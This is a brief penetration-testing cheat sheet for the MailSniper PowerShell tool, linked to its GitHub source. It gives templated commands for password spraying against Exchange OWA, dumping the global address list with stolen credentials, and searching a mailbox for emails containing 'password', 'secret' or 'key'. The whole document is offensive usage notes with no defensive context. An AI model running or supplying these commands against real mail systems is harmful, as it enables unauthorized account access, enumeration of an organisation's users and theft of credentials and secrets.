### source
https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1  

### passwordspray
```
Invoke-PasswordSprayOWA -ExchHostname <rhost> -UserList <userFile> -Password <password>
```

### extract address book
```
Get-GlobalAddressList -ExchHostname <rhost> -UserName <domain>\<user> -Password <password> -OutFile <outFile>
```

### search for passwords inside last 100 e-mails for the current user session
```
Invoke-SelfSearch -Mailbox <user>@<domain> -Terms "*password*","*secret*","*key*"
```

